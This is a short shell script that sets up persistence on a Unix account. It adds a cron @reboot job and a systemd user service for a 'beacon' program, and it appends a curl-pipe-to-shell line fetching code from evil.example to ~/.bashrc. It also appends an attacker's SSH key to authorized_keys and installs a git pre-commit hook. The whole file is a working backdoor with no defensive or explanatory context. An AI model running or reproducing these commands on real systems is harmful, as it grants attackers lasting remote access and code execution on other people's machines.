#!/bin/sh
(crontab -l 2>/dev/null; echo "@reboot /home/user/.local/bin/beacon") | crontab -
mkdir -p ~/.config/systemd/user && cp beacon.service ~/.config/systemd/user/
echo 'curl -s https://evil.example/beacon | sh' >> ~/.bashrc
echo "ssh-ed25519 AAAAC3 attacker" >> ~/.ssh/authorized_keys
cp hook.sh .git/hooks/pre-commit
